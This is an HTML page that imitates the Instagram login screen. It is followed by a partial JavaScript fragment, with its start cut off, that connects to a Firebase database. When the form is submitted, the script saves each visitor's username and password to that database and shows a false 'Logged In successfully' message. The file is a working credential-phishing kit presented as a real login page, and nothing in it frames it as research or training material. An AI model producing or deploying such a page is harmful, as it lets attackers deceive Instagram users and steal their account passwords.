<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="style1.css">
</head>
<body>
    <div class="container">
        <form method="post" id="form">
            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png">
            <div class="container1">
                <input type="text" id="name" placeholder="Username, Email or Phone no">
                <input type="password" id="password" placeholder="Password">
            </div>
            <button class="btn" type="submit" name="submit">Log In</button>
        </form>
        <div id="or">or</div>
        <div class="facebook">
            <div class="fb"><a href="https://www.facebook.com/login/">Log In with Facebook</a></div>
            <div class="fp"> Forget Password?</div>
        </div>
    </div>
    <div class="container2">
        <div class="acc">Don't have an account?</div>
        <div class="signup">Sign Up</div>
    </div>
</body>

    };
  
    // Initialize Firebase
    const app = initializeApp(firebaseConfig);
    const analytics = getAnalytics(app);
    const db = getDatabase(app)

    document.getElementById('form').addEventListener('submit', function(e) {
    e.preventDefault();
    set(ref(db, 'users/' + Math.random()), {
        name: document.getElementById('name').value,
        password: document.getElementById('password').value
    });
 
    alert('Logged In successfully');
    document.getElementById('form').reset();
});
